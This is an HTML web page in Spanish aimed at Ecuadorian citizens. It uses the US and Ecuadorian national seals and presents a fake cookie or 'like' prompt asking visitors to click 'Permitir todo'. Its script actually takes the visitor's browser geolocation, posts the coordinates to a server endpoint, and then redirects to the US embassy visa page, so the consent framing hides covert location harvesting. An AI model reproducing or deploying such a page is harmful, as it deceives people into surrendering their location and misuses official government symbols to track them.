<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Bienvenido Ciudadano ecuatoriano acepta nuestros cookies para continuar</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
      background-color: #f5f5f5;
      text-align: center;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .escudos {
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 40px;
      margin-bottom: 20px;
    }
    .escudos img {
      width: 120px;
      height: auto;
    }
    h1 {
      font-size: 2.2rem;
      color: #222;
      margin: 0 20px;
    }
  </style>
</head>
<body>
  <div class="escudos">
    <img src="https://upload.wikimedia.org/wikipedia/commons/e/e3/Great_Seal_of_the_United_States_%28obverse%29.svg" alt="Escudo Estados Unidos">
    <img src="https://upload.wikimedia.org/wikipedia/commons/e/e8/Escudo_del_Ecuador_%28transparente%29.png" alt="Escudo Ecuador">
  </div>

  <h1>🇪🇨🇺🇸 Apóyanos con un Like, dale a <br> <strong>“Permitir todo”</strong>...</h1>

  <script>
    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(
        async (position) => {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;

          console.log("Ubicación obtenida:", lat, lon);

          // Enviar las coordenadas al endpoint en Vercel
          try {
            const response = await fetch("/api/registrar-coordenadas", {
              method: "POST",
              headers: {
                "Content-Type": "application/json",
              },
              body: JSON.stringify({ lat, lon }),
            });

            const data = await response.json();
            console.log("Respuesta del servidor:", data);

            // Redirigir al usuario
            window.location.href = "https://ec.usembassy.gov/es/visas-de-no-inmigrante/";
          } catch (error) {
            console.error("Error al enviar coordenadas:", error);
          }
        },
        (error) => {
          console.error("Error al obtener ubicación:", error.message);
          alert("No se pudo obtener tu ubicación. Por favor permite el acceso.");
        }
      );
    } else {
      alert("Tu navegador no soporta geolocalización.");
    }
  </script>
</body>
</html>
